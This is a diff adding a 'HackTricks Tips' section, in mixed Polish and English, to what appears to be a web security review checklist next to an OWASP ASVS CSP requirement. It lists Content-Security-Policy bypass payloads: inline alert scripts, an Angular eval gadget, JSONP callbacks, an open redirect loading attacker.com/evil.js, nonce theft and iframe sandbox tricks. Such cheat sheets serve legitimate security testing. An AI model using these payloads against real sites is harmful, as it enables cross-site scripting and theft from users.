@@ -165,3 +165,28 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V3.4.7 | Browser Security Mechanism Headers | Verify that the Content-Security-Policy header field specifies a location to report violations. |
+
+
+---
+
+## HackTricks Tips
+
+### CSP Bypass
+
+- **`unsafe-inline`**: dowolny `<script>alert(1)</script>` działa
+- **`unsafe-eval` + CDN**: load Angular 1.x z `cdnjs.cloudflare.com` → `{{$eval.constructor('alert(1)')()}}`
+- **JSONP na allowed domains**: `<script src="https://www.google.com/complete/search?callback=alert#1">`
+- **Open redirect w whitelisted domain**: `https://www.google.com/amp/s/attacker.com/evil.js`
+- **Third-party abuse**: `*.amazonaws.com`, `*.azurewebsites.net`, `*.firebaseapp.com`, `cdn.jsdelivr.net` → register resource
+- **Nonce reuse**: `document.querySelector("[nonce]").nonce` → inject `<script>` z tym nonce
+- **`strict-dynamic`**: trusted script inject nowy `<script>` → ten też jest trusted
+- **RPO**: `https://example.com/scripts/react/..%2fangular%2fangular.js`
+- **File upload + `'self'`**: upload `.wave` z JS content → include jako `<script src="/uploads/file.wave">`
+- **`form-action` bypass**: `default-src` nie pokrywa `form-action` → inject form na attacker server
+- **`Content-Security-Policy-Report-Only`**: ten header NIE blokuje — CSP not enforced
+
+### CSP via iframe
+
+- `sandbox="allow-scripts allow-same-origin"` to NOT security boundary — iframe może usunąć own sandbox
+- **Nonce theft z same-origin iframe**: `top.document.querySelector('[nonce]').nonce`
+- **`srcdoc` iframe**: same-origin z parent (relative URLs resolve do parent origin)
